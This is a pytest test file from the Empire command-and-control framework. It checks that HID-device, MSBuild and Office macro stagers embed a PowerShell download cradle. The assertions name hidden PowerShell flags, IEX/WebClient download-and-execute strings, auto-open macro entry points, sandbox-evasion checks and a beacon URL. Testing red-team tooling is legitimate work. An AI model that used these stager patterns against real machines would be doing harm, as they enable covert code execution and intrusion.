"""Generation tests for the launcher/HID/document stager templates.

These stagers wrap ``stagergenv2.generate_launcher`` and embed the resulting
stage0 one-liner into a device- or application-specific payload (MSBuild XML,
Rubber Ducky, Bash Bunny, Teensy, Office macro). They were previously only
exercised at import time (``__init__``), so ``generate()`` was almost entirely
uncovered. Each test drives a real powershell launcher through ``generate()``
and asserts the payload structure plus the embedded, base64-decodable launcher,
then checks the empty-launcher guard raises ``StagerGenerationException``.
"""

import base64
import re
from unittest.mock import MagicMock

import pytest

from empire.server.core.exceptions import StagerGenerationException
from empire.server.stagers.multi.macro import Stager as MacroStager
from empire.server.stagers.osx.ducky import Stager as OsxDuckyStager
from empire.server.stagers.osx.macro import Stager as OsxMacroStager
from empire.server.stagers.osx.teensy import Stager as OsxTeensyStager
from empire.server.stagers.windows.bunny import Stager as BunnyStager
from empire.server.stagers.windows.ducky import Stager as DuckyStager
from empire.server.stagers.windows.launcher_xml import Stager as LauncherXmlStager
from empire.server.stagers.windows.macro import Stager as WindowsMacroStager
from empire.server.stagers.windows.teensy import Stager as TeensyStager

LISTENER = "new-listener-1"


def _decode_enc(blob: str) -> str:
    """Decode the trailing base64 ``-enc`` blob of a powershell launcher."""
    return base64.b64decode(blob).decode("utf-16le")


def _assert_is_stage0_launcher(blob: str) -> None:
    """The embedded blob decodes to an Empire powershell stage0 download cradle."""
    decoded = _decode_enc(blob)
    assert "System.Net.WebClient" in decoded
    assert "DownloadData" in decoded
    assert "IEX" in decoded


def _mock_main(launcher):
    """A MainMenu double whose generate_launcher returns ``launcher``.

    ``launcher`` may be a str (constant) or a list (side_effect sequence).
    """
    main = MagicMock()
    if isinstance(launcher, list):
        main.stagergenv2.generate_launcher.side_effect = launcher
    else:
        main.stagergenv2.generate_launcher.return_value = launcher
    return main


# --------------------------------------------------------------------------- #
# windows/launcher_xml  (MSBuild XML)
# --------------------------------------------------------------------------- #
def test_launcher_xml_powershell_wraps_launcher_in_msbuild_project(main):
    stager = LauncherXmlStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert isinstance(code, str)
    # Structural MSBuild markers.
    assert code.startswith('<Project ToolsVersion="4.0"')
    assert 'TaskName="ClassExample"' in code
    assert 'TaskFactory="CodeTaskFactory"' in code
    assert "System.Management.Automation" in code
    assert code.endswith("</Project>")

    # The base64 launcher is embedded and must decode to a real stage0 cradle.
    m = re.search(r'Convert\.FromBase64String\("([A-Za-z0-9+/=]+)"\)', code)
    assert m, "expected an embedded base64 launcher"
    _assert_is_stage0_launcher(m.group(1))


def test_launcher_xml_raises_when_launcher_empty():
    stager = LauncherXmlStager(_mock_main(""))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()


# --------------------------------------------------------------------------- #
# windows/ducky  (Rubber Ducky)
# --------------------------------------------------------------------------- #
def test_ducky_powershell_emits_enc_oneliner(main):
    stager = DuckyStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert code.startswith("DELAY 3000\n")
    assert "GUI r\n" in code
    assert "STRING powershell\n" in code  # default interpreter
    # Unobfuscated path emits the fixed powershell -enc invocation.
    m = re.search(r"-enc (\S+) \n", code)
    assert m, "expected '-enc <blob>' one-liner"
    _assert_is_stage0_launcher(m.group(1))
    assert code.endswith("ENTER\n")


def test_ducky_interpreter_cmd_is_typed(main):
    stager = DuckyStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["Interpreter"]["Value"] = "cmd"

    code = stager.generate()

    assert "STRING cmd\n" in code
    assert "STRING powershell\n" not in code


def test_ducky_obfuscate_launcher_branch_uses_full_launcher():
    """When Obfuscate is on and the obfuscation command targets the launcher,
    the whole (already-obfuscated) launcher is typed instead of the -enc blob."""
    stager = DuckyStager(_mock_main("IEX (New-Object Net.WebClient) launcher-cmd"))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["Obfuscate"]["Value"] = True
    stager.options["ObfuscateCommand"]["Value"] = r"launcher\All\1"

    code = stager.generate()

    assert "STRING IEX (New-Object Net.WebClient) launcher-cmd \n" in code
    assert "-enc" not in code


def test_ducky_raises_when_launcher_empty():
    stager = DuckyStager(_mock_main(""))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()


# --------------------------------------------------------------------------- #
# windows/bunny  (Bash Bunny)
# --------------------------------------------------------------------------- #
def test_bunny_powershell_emits_hid_attackmode(main):
    stager = BunnyStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert code.startswith("#!/bin/bash\n")
    assert "ATTACKMODE HID\n" in code
    assert "Q STRING powershell\n" in code
    assert code.endswith("LED R G B 200\n")
    # No keyboard layout by default.
    assert "Q SET_LANGUAGE" not in code
    m = re.search(r"-enc (\S+)\n", code)
    assert m
    _assert_is_stage0_launcher(m.group(1))


def test_bunny_keyboard_layout_adds_set_language(main):
    stager = BunnyStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["Keyboard"]["Value"] = "DE"

    code = stager.generate()

    assert "Q SET_LANGUAGE DE\n" in code


def test_bunny_raises_when_launcher_empty():
    stager = BunnyStager(_mock_main(""))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()


# --------------------------------------------------------------------------- #
# windows/teensy  (Teensy / Arduino HID sketch)
# --------------------------------------------------------------------------- #
def test_teensy_powershell_emits_arduino_sketch(main):
    stager = TeensyStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    # The Arduino sketch scaffolding and Empire entry point.
    assert "unsigned int lock_check_wait = 1000;" in code
    assert "void empire(void) {" in code
    assert "void setup(void) {" in code
    assert code.endswith("void loop() {}")
    assert 'Keyboard.print("powershell -W Hidden -nop -noni -enc ");' in code
    # The launcher blob is typed via Keyboard.print("<blob>").
    m = re.search(r'Keyboard\.print\("([A-Za-z0-9+/=]+)"\);', code)
    assert m
    _assert_is_stage0_launcher(m.group(1))


def test_teensy_raises_when_launcher_empty():
    stager = TeensyStager(_mock_main(""))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()


# --------------------------------------------------------------------------- #
# multi/macro  (Office VBA macro)
# --------------------------------------------------------------------------- #
def test_macro_emits_cross_platform_vba(main):
    stager = MacroStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    # Office auto-exec entry points.
    assert "Sub AutoOpen()" in code
    assert "Sub Auto_Open()" in code
    assert "Sub Document_Open()" in code
    assert "Public Function Debugging() As Variant" in code
    # Mac + Windows rendering branches both present.
    assert 'system Lib "libc.dylib"' in code
    assert 'CreateObject("Microsoft.XMLHTTP")' in code
    assert "Win32_Process" in code
    # The powershell payload is chunked into VBA string concatenation.
    assert 'str = "' in code


def test_macro_custom_pixel_track_url_is_embedded(main):
    stager = MacroStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["PixelTrackURL"]["Value"] = "http://198.51.100.5/beacon?s="

    code = stager.generate()

    assert 'tracking = "http://198.51.100.5/beacon?s="' in code


def test_macro_raises_when_python_launcher_empty():
    stager = MacroStager(_mock_main(""))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException, match="python launcher"):
        stager.generate()


def test_macro_raises_when_powershell_launcher_empty():
    # First call (python) succeeds with a quoted payload; second (powershell) is empty.
    stager = MacroStager(_mock_main(["exec('Zm9v')", ""]))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException, match="powershell launcher"):
        stager.generate()


# --------------------------------------------------------------------------- #
# osx/ducky  (macOS Rubber Ducky -> Terminal)
# --------------------------------------------------------------------------- #
def test_osx_ducky_integration_opens_terminal(main):
    """End-to-end with a real python launcher: opens Spotlight->Terminal and
    types the launcher on its own STRING line."""
    stager = OsxDuckyStager(main)
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert code.startswith("DELAY 1000\n")
    assert "COMMAND SPACE\n" in code
    assert "STRING TERMINAL\n" in code
    # The launcher is typed on a STRING line after the second DELAY.
    assert "DELAY 1000\nSTRING " in code
    assert code.endswith("DELAY 1000\n")


def test_osx_ducky_embeds_launcher_verbatim():
    stager = OsxDuckyStager(_mock_main("PYLAUNCH"))
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert "STRING PYLAUNCH\nENTER\n" in code


def test_osx_ducky_raises_when_launcher_empty():
    stager = OsxDuckyStager(_mock_main(""))
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()


# --------------------------------------------------------------------------- #
# osx/teensy  (macOS Teensy HID sketch)
# --------------------------------------------------------------------------- #
def test_osx_teensy_emits_mac_arduino_sketch():
    stager = OsxTeensyStager(_mock_main("PYLAUNCH"))
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert "void clearKeys (){" in code
    assert "void mac_openTerminal(void) {" in code
    assert "void empire(void) {" in code
    assert code.endswith("void loop() {}")
    assert 'Keyboard.print("PYLAUNCH");' in code


def test_osx_teensy_escapes_double_quotes_in_launcher():
    """The launcher is embedded inside a C string literal, so its double quotes
    must be backslash-escaped."""
    stager = OsxTeensyStager(_mock_main('echo "hi"'))
    stager.options["Listener"]["Value"] = LISTENER

    code = stager.generate()

    assert 'Keyboard.print("echo \\"hi\\"");' in code


def test_osx_teensy_raises_when_launcher_empty():
    stager = OsxTeensyStager(_mock_main(""))
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()


# --------------------------------------------------------------------------- #
# osx/macro  (AppleScript / Office-for-Mac VBA)
# --------------------------------------------------------------------------- #
def test_osx_macro_new_version_uses_popen_alias():
    # A realistic launcher payload (>54 chars) so formStr's chunking loop runs.
    inner = "S" * 80
    stager = OsxMacroStager(_mock_main(f"exec('{inner}')"))
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["Version"]["Value"] = "new"

    macro = stager.generate()

    assert 'Alias "popen"' in macro
    assert "Sub Auto_Open()" in macro
    assert "Public Function Debugging() As Variant" in macro
    # formStr emits the first 54-char chunk then continuation lines.
    assert 'cmd = "' + "S" * 54 + '"' in macro
    assert 'cmd = cmd + "' in macro


def test_osx_macro_old_version_declares_libc_system():
    stager = OsxMacroStager(_mock_main("exec('SENTINEL')"))
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["Version"]["Value"] = "old"

    macro = stager.generate()

    assert "#If VBA7 Then" in macro
    assert 'system Lib "libc.dylib"' in macro
    assert 'Alias "popen"' not in macro


def test_osx_macro_invalid_version_raises_value_error():
    stager = OsxMacroStager(_mock_main("exec('SENTINEL')"))
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["Version"]["Value"] = "bogus"

    with pytest.raises(ValueError, match="Accepts"):
        stager.generate()


def test_osx_macro_raises_when_launcher_empty():
    stager = OsxMacroStager(_mock_main(""))
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException, match="python launcher"):
        stager.generate()


# --------------------------------------------------------------------------- #
# windows/macro  (Office 97-2007 VBA, word/excel x autoopen/autoclose)
# --------------------------------------------------------------------------- #
def test_windows_macro_integration_word_autoopen(main):
    stager = WindowsMacroStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    macro = stager.generate()

    assert macro.startswith("Sub AutoOpen()\n")
    assert 'CreateObject("WScript.Shell")' in macro
    assert ".Run(" in macro
    assert "End Function\n" in macro


@pytest.mark.parametrize(
    ("doc_type", "trigger", "expected_sub"),
    [
        ("word", "autoopen", "Sub AutoOpen()"),
        ("word", "autoclose", "Sub AutoClose()"),
        ("excel", "autoopen", "Sub Workbook_Open()"),
        ("excel", "autoclose", "Sub Workbook_BeforeClose(Cancel As Boolean)"),
    ],
)
def test_windows_macro_sub_name_matches_doc_type_and_trigger(
    doc_type, trigger, expected_sub
):
    stager = WindowsMacroStager(_mock_main("LAUNCHER_BLOB"))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["DocType"]["Value"] = doc_type
    stager.options["Trigger"]["Value"] = trigger

    macro = stager.generate()

    assert expected_sub in macro
    assert "LAUNCHER_BLOB" in macro


def test_windows_macro_outlook_evasion_adds_sandbox_checks():
    stager = WindowsMacroStager(_mock_main("LAUNCHER_BLOB"))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER
    stager.options["OutlookEvasion"]["Value"] = True

    macro = stager.generate()

    assert "Win32_ComputerSystemproduct" in macro
    assert "Win32_logicaldisk" in macro


def test_windows_macro_no_outlook_evasion_by_default():
    stager = WindowsMacroStager(_mock_main("LAUNCHER_BLOB"))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    macro = stager.generate()

    assert "Win32_ComputerSystemproduct" not in macro


def test_windows_macro_raises_when_launcher_empty():
    stager = WindowsMacroStager(_mock_main(""))
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = LISTENER

    with pytest.raises(StagerGenerationException):
        stager.generate()
